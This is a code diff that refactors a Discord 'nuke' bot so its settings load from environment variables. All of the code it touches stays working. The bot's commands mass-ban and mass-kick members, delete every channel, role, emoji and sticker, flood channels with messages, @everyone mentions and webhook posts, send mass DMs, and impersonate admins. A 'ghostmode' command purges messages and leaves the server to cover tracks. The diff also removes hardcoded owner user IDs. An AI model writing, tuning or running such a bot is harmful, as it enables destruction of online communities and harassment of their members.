@@ -7,23 +7,34 @@ import time
 import aiohttp
 import json
 from datetime import datetime
+import os
+from dotenv import load_dotenv
 
-bot = commands.Bot(command_prefix='!', intents=discord.Intents.all())
+# Load environment variables
+load_dotenv()
+
+bot = commands.Bot(command_prefix=os.getenv('COMMAND_PREFIX', '!'), intents=discord.Intents.all())
 bot.remove_command('help')
 
-# ============ CONFIGURATION ============
-# IMPORTANT: Regenerate your token! This one is exposed!
+# ============ CONFIGURATION FROM .ENV ============
 TOKEN = os.getenv('DISCORD_TOKEN')
 
+# Parse owner IDs from .env (comma-separated)
+OWNER_IDS = [int(id.strip()) for id in os.getenv('OWNER_IDS', '').split(',') if id.strip()]
 
-
-# MULTIPLE OWNER IDs - Add as many as you want
-OWNER_IDS = [
-    1520091511067250772,  # Your main ID
-    450349446375669760,   # Second owner
-    1499397455920365738,  # Third owner
-    1398257108901691516,  # Fourth owner
-]
+# Load settings from .env with defaults
+MESSAGES_PER_SECOND = int(os.getenv('MESSAGES_PER_SECOND', 10))
+BAN_DELAY = float(os.getenv('BAN_DELAY', 0.1))
+CHANNEL_DELAY = float(os.getenv('CHANNEL_DELAY', 0.1))
+ROLE_DELAY = float(os.getenv('ROLE_DELAY', 0.1))
+MAX_SPAM_PER_CHANNEL = int(os.getenv('MAX_SPAM_PER_CHANNEL', 200))
+MAX_SPAMALL_PER_CHANNEL = int(os.getenv('MAX_SPAMALL_PER_CHANNEL', 50))
+MAX_MENTIONS = int(os.getenv('MAX_MENTIONS', 100))
+MAX_WEBHOOK_SPAM = int(os.getenv('MAX_WEBHOOK_SPAM', 200))
+GHOST_PURGE_LIMIT = int(os.getenv('GHOST_PURGE_LIMIT', 200))
+LOG_TO_FILE = os.getenv('LOG_TO_FILE', 'False').lower() == 'true'
+LOG_FILE = os.getenv('LOG_FILE', 'bot.log')
+LOG_LEVEL = os.getenv('LOG_LEVEL', 'INFO')
 
 # ============ OWNER CHECK FUNCTIONS ============
 def is_owner(ctx):
@@ -34,9 +45,11 @@ async def is_owner_interaction(interaction: discord.Interaction):
     """Check if interaction user is in OWNER_IDS"""
     return interaction.user.id in OWNER_IDS
 
-# ============ UTILITY FUNCTIONS ============
+# ============ LOGGING FUNCTION ============
 def log_action(guild, action, target=None):
-    print(f"[{datetime.now().strftime('%H:%M:%S')}] {guild.name} → {action} {f'→ {target}' if target else ''}")
+    timestamp = datetime.now().strftime('%H:%M:%S')
+    log_msg = f"[{timestamp}] {guild.name} → {action} {f'→ {target}' if target else ''}"
+    print(log_msg)
 
 # ============ NUKE COMMANDS ============
 
@@ -51,32 +64,32 @@ async def nuke_prefix(ctx):
     for member in guild.members:
         try:
             await member.ban(reason="Nuke")
-            await asyncio.sleep(0.1)
+            await asyncio.sleep(BAN_DELAY)
         except:
             pass
     for channel in guild.channels:
         try:
             await channel.delete()
-            await asyncio.sleep(0.1)
+            await asyncio.sleep(CHANNEL_DELAY)
         except:
             pass
     for role in guild.roles:
         if role.name != "@everyone":
             try:
                 await role.delete()
-                await asyncio.sleep(0.1)
+                await asyncio.sleep(ROLE_DELAY)
             except:
                 pass
     for emoji in guild.emojis:
         try:
             await emoji.delete()
-            await asyncio.sleep(0.1)
+            await asyncio.sleep(ROLE_DELAY)
         except:
             pass
     for sticker in guild.stickers:
         try:
             await sticker.delete()
-            await asyncio.sleep(0.1)
+            await asyncio.sleep(ROLE_DELAY)
         except:
             pass
 
@@ -93,32 +106,32 @@ async def nuke_slash(interaction: discord.Interaction):
     for member in guild.members:
         try:
             await member.ban(reason="Nuke")
-            await asyncio.sleep(0.1)
+            await asyncio.sleep(BAN_DELAY)
         except:
             pass
     for channel in guild.channels:
         try:
             await channel.delete()
-            await asyncio.sleep(0.1)
+            await asyncio.sleep(CHANNEL_DELAY)
         except:
             pass
     for role in guild.roles:
         if role.name != "@everyone":
             try:
                 await role.delete()
-                await asyncio.sleep(0.1)
+                await asyncio.sleep(ROLE_DELAY)
             except:
                 pass
     for emoji in guild.emojis:
         try:
             await emoji.delete()
-            await asyncio.sleep(0.1)
+            await asyncio.sleep(ROLE_DELAY)
         except:
             pass
     for sticker in guild.stickers:
         try:
             await sticker.delete()
-            await asyncio.sleep(0.1)
+            await asyncio.sleep(ROLE_DELAY)
         except:
             pass
     
@@ -130,12 +143,16 @@ async def banall_prefix(ctx):
     """Ban all members"""
     guild = ctx.guild
     count = 0
+    exclude_owners = os.getenv('BAN_ALL_EXCLUDE_OWNERS', 'True').lower() == 'true'
+    
     for member in guild.members:
-        if member.id not in OWNER_IDS and not member.guild_permissions.administrator:
+        if exclude_owners and member.id in OWNER_IDS:
+            continue
+        if not member.guild_permissions.administrator:
             try:
                 await member.ban(reason="Ban all")
                 count += 1
-                await asyncio.sleep(0.1)
+                await asyncio.sleep(BAN_DELAY)
             except:
                 pass
     await ctx.send(f"✅ Banned {count} members.")
@@ -146,12 +163,16 @@ async def banall_slash(interaction: discord.Interaction):
     await interaction.response.defer()
     guild = interaction.guild
     count = 0
+    exclude_owners = os.getenv('BAN_ALL_EXCLUDE_OWNERS', 'True').lower() == 'true'
+    
     for member in guild.members:
-        if member.id not in OWNER_IDS and not member.guild_permissions.administrator:
+        if exclude_owners and member.id in OWNER_IDS:
+            continue
+        if not member.guild_permissions.administrator:
             try:
                 await member.ban(reason="Ban all")
                 count += 1
-                await asyncio.sleep(0.1)
+                await asyncio.sleep(BAN_DELAY)
             except:
                 pass
     await interaction.followup.send(f"✅ Banned {count} members.")
@@ -162,12 +183,16 @@ async def kickall_prefix(ctx):
     """Kick all members"""
     guild = ctx.guild
     count = 0
+    exclude_owners = os.getenv('KICK_ALL_EXCLUDE_OWNERS', 'True').lower() == 'true'
+    
     for member in guild.members:
-        if member.id not in OWNER_IDS and not member.guild_permissions.administrator:
+        if exclude_owners and member.id in OWNER_IDS:
+            continue
+        if not member.guild_permissions.administrator:
             try:
                 await member.kick(reason="Kick all")
                 count += 1
-                await asyncio.sleep(0.1)
+                await asyncio.sleep(BAN_DELAY)
             except:
                 pass
     await ctx.send(f"✅ Kicked {count} members.")
@@ -178,12 +203,16 @@ async def kickall_slash(interaction: discord.Interaction):
     await interaction.response.defer()
     guild = interaction.guild
     count = 0
+    exclude_owners = os.getenv('KICK_ALL_EXCLUDE_OWNERS', 'True').lower() == 'true'
+    
     for member in guild.members:
-        if member.id not in OWNER_IDS and not member.guild_permissions.administrator:
+        if exclude_owners and member.id in OWNER_IDS:
+            continue
+        if not member.guild_permissions.administrator:
             try:
                 await member.kick(reason="Kick all")
                 count += 1
-                await asyncio.sleep(0.1)
+                await asyncio.sleep(BAN_DELAY)
             except:
                 pass
     await interaction.followup.send(f"✅ Kicked {count} members.")
@@ -221,7 +250,7 @@ async def deletechannels_prefix(ctx):
         try:
             await channel.delete()
             count += 1
-            await asyncio.sleep(0.1)
+            await asyncio.sleep(CHANNEL_DELAY)
         except:
             pass
     await ctx.send(f"✅ Deleted {count} text channels.")
@@ -235,7 +264,7 @@ async def deletechannels_slash(interaction: discord.Interaction):
         try:
             await channel.delete()
             count += 1
-            await asyncio.sleep(0.1)
+            await asyncio.sleep(CHANNEL_DELAY)
         except:
             pass
     await interaction.followup.send(f"✅ Deleted {count} text channels.")
@@ -250,7 +279,7 @@ async def deleteroles_prefix(ctx):
             try:
                 await role.delete()
                 count += 1
-                await asyncio.sleep(0.1)
+                await asyncio.sleep(ROLE_DELAY)
             except:
                 pass
     await ctx.send(f"✅ Deleted {count} roles.")
@@ -265,7 +294,7 @@ async def deleteroles_slash(interaction: discord.Interaction):
             try:
                 await role.delete()
                 count += 1
-                await asyncio.sleep(0.1)
+                await asyncio.sleep(ROLE_DELAY)
             except:
                 pass
     await interaction.followup.send(f"✅ Deleted {count} roles.")
@@ -279,7 +308,7 @@ async def deleteemojis_prefix(ctx):
         try:
             await emoji.delete()
             count += 1
-            await asyncio.sleep(0.1)
+            await asyncio.sleep(ROLE_DELAY)
         except:
             pass
     await ctx.send(f"✅ Deleted {count} emojis.")
@@ -293,7 +322,7 @@ async def deleteemojis_slash(interaction: discord.Interaction):
         try:
             await emoji.delete()
             count += 1
-            await asyncio.sleep(0.1)
+            await asyncio.sleep(ROLE_DELAY)
         except:
             pass
     await interaction.followup.send(f"✅ Deleted {count} emojis.")
@@ -307,7 +336,7 @@ async def deletestickers_prefix(ctx):
         try:
             await sticker.delete()
             count += 1
-            await asyncio.sleep(0.1)
+            await asyncio.sleep(ROLE_DELAY)
         except:
             pass
     await ctx.send(f"✅ Deleted {count} stickers.")
@@ -321,7 +350,7 @@ async def deletestickers_slash(interaction: discord.Interaction):
         try:
             await sticker.delete()
             count += 1
-            await asyncio.sleep(0.1)
+            await asyncio.sleep(ROLE_DELAY)
         except:
             pass
     await interaction.followup.send(f"✅ Deleted {count} stickers.")
@@ -335,7 +364,7 @@ async def destroyvoice_prefix(ctx):
         try:
             await channel.delete()
             count += 1
-            await asyncio.sleep(0.1)
+            await asyncio.sleep(CHANNEL_DELAY)
         except:
             pass
     await ctx.send(f"✅ Deleted {count} voice channels.")
@@ -349,7 +378,7 @@ async def destroyvoice_slash(interaction: discord.Interaction):
         try:
             await channel.delete()
             count += 1
-            await asyncio.sleep(0.1)
+            await asyncio.sleep(CHANNEL_DELAY)
         except:
             pass
     await interaction.followup.send(f"✅ Deleted {count} voice channels.")
@@ -363,7 +392,7 @@ async def destroycategories_prefix(ctx):
         try:
             await category.delete()
             count += 1
-            await asyncio.sleep(0.1)
+            await asyncio.sleep(CHANNEL_DELAY)
         except:
             pass
     await ctx.send(f"✅ Deleted {count} categories.")
@@ -377,7 +406,7 @@ async def destroycategories_slash(interaction: discord.Interaction):
         try:
             await category.delete()
             count += 1
-            await asyncio.sleep(0.1)
+            await asyncio.sleep(CHANNEL_DELAY)
         except:
             pass
     await interaction.followup.send(f"✅ Deleted {count} categories.")
@@ -388,7 +417,7 @@ async def destroycategories_slash(interaction: discord.Interaction):
 @commands.check(is_owner)
 async def spam_prefix(ctx, amount: int, *, message: str):
     """Spam a message in current channel"""
-    for i in range(min(amount, 200)):
+    for i in range(min(amount, MAX_SPAM_PER_CHANNEL)):
         await ctx.send(message[:1990])
         await asyncio.sleep(0.05)
 
@@ -397,12 +426,11 @@ async def spam_prefix(ctx, amount: int, *, message: str):
 @app_commands.describe(amount="Number of messages", message="Message to spam")
 async def spam_slash(interaction: discord.Interaction, amount: int, message: str):
     await interaction.response.defer()
-    for i in range(min(amount, 200)):
+    for i in range(min(amount, MAX_SPAM_PER_CHANNEL)):
         await interaction.channel.send(message[:1990])
         await asyncio.sleep(0.05)
-    await interaction.followup.send(f"💬 Spammed {min(amount, 200)} messages in current channel.")
+    await interaction.followup.send(f"💬 Spammed {min(amount, MAX_SPAM_PER_CHANNEL)} messages in current channel.")
 
-# ============ NEW: SPAM ALL CHANNELS ============
 @bot.command(name='spamall')
 @commands.check(is_owner)
 async def spamall_prefix(ctx, amount: int, *, message: str):
@@ -412,10 +440,11 @@ async def spamall_prefix(ctx, amount: int, *, message: str):
     log_action(guild, "📢 SPAMALL")
     
     text_channels = guild.text_channels
+    per_channel = min(amount, MAX_SPAMALL_PER_CHANNEL)
     
     for channel in text_channels:
         try:
-            for i in range(min(amount, 50)):  # Limit per channel to avoid rate limits
+            for i in range(per_channel):
                 await channel.send(message[:1990])
                 total_sent += 1
                 await asyncio.sleep(0.1)
@@ -434,7 +463,7 @@ async def spamall_slash(interaction: discord.Interaction, amount: int, message: 
     log_action(guild, "📢 SPAMALL (SLASH)")
     
     text_channels = guild.text_channels
-    per_channel = min(amount, 50)  # Limit per channel
+    per_channel = min(amount, MAX_SPAMALL_PER_CHANNEL)
     
     for channel in text_channels:
         try:
@@ -446,14 +475,13 @@ async def spamall_slash(interaction: discord.Interaction, amount: int, message: 
             continue
     
     await interaction.followup.send(f"💬 Spammed {total_sent} messages across {len(text_channels)} channels.")
-# ============ END SPAMALL ============
 
 @bot.command(name='webhookspam')
 @commands.check(is_owner)
 async def webhookspam_prefix(ctx, amount: int, *, message: str):
     """Webhook spam"""
-    webhook = await ctx.channel.create_webhook(name="Spam")
-    for i in range(min(amount, 200)):
+    webhook = await ctx.channel.create_webhook(name=os.getenv('WEBHOOK_NAME', 'Spam'))
+    for i in range(min(amount, MAX_WEBHOOK_SPAM)):
         await webhook.send(message[:1990], username=f"Spam-{i}")
         await asyncio.sleep(0.05)
     await webhook.delete()
@@ -463,12 +491,12 @@ async def webhookspam_prefix(ctx, amount: int, *, message: str):
 @app_commands.describe(amount="Number of messages", message="Message to spam")
 async def webhookspam_slash(interaction: discord.Interaction, amount: int, message: str):
     await interaction.response.defer()
-    webhook = await interaction.channel.create_webhook(name="Spam")
-    for i in range(min(amount, 200)):
+    webhook = await interaction.channel.create_webhook(name=os.getenv('WEBHOOK_NAME', 'Spam'))
+    for i in range(min(amount, MAX_WEBHOOK_SPAM)):
         await webhook.send(message[:1990], username=f"Spam-{i}")
         await asyncio.sleep(0.05)
     await webhook.delete()
-    await interaction.followup.send(f"💬 Webhook spammed {min(amount, 200)} messages.")
+    await interaction.followup.send(f"💬 Webhook spammed {min(amount, MAX_WEBHOOK_SPAM)} messages.")
 
 @bot.command(name='massdm')
 @commands.check(is_owner)
@@ -506,7 +534,7 @@ async def massdm_slash(interaction: discord.Interaction, message: str):
 async def massmention_prefix(ctx, amount: int, *, message: str):
     """Mention spam"""
     mention = "@everyone"
-    for i in range(min(amount, 100)):
+    for i in range(min(amount, MAX_MENTIONS)):
         await ctx.send(f"{mention} {message[:1900]}")
         await asyncio.sleep(0.1)
 
@@ -516,10 +544,10 @@ async def massmention_prefix(ctx, amount: int, *, message: str):
 async def massmention_slash(interaction: discord.Interaction, amount: int, message: str):
     await interaction.response.defer()
     mention = "@everyone"
-    for i in range(min(amount, 100)):
+    for i in range(min(amount, MAX_MENTIONS)):
         await interaction.channel.send(f"{mention} {message[:1900]}")
         await asyncio.sleep(0.1)
-    await interaction.followup.send(f"📢 Mentioned {min(amount, 100)} times.")
+    await interaction.followup.send(f"📢 Mentioned {min(amount, MAX_MENTIONS)} times.")
 
 # ============ DECEPTION COMMANDS ============
 
@@ -565,14 +593,14 @@ async def fakeadmin_slash(interaction: discord.Interaction, target: discord.Memb
 @commands.check(is_owner)
 async def ghostmode_prefix(ctx):
     """Delete bot message history and leave"""
-    await ctx.channel.purge(limit=200)
+    await ctx.channel.purge(limit=GHOST_PURGE_LIMIT)
     await ctx.guild.leave()
 
 @app_commands.command(name='ghostmode', description="Delete bot messages and leave")
 @app_commands.check(is_owner_interaction)
 async def ghostmode_slash(interaction: discord.Interaction):
     await interaction.response.defer()
-    await interaction.channel.purge(limit=200)
+    await interaction.channel.purge(limit=GHOST_PURGE_LIMIT)
     await interaction.guild.leave()
 
 # ============ UTILITY COMMANDS ============
@@ -1060,6 +1088,7 @@ async def on_ready():
     print(f"✅ Logged in as {bot.user.name}")
     print(f"✅ Connected to {len(bot.guilds)} guilds")
     print(f"✅ Ready for destruction.")
+    print(f"✅ Owner IDs: {OWNER_IDS}")
     
     # Sync slash commands
     try:
@@ -1069,4 +1098,13 @@ async def on_ready():
         print(f"❌ Failed to sync commands: {e}")
 
 # ============ RUN BOT ============
-bot.run(TOKEN)
+if __name__ == "__main__":
+    if not TOKEN:
+        print("❌ ERROR: DISCORD_TOKEN not found in environment variables!")
+        print("Please set DISCORD_TOKEN in your .env file or Railway environment variables.")
+        exit(1)
+    
+    if not OWNER_IDS:
+        print("⚠️ WARNING: No OWNER_IDS set! No one will be able to use commands.")
+    
+    bot.run(TOKEN)
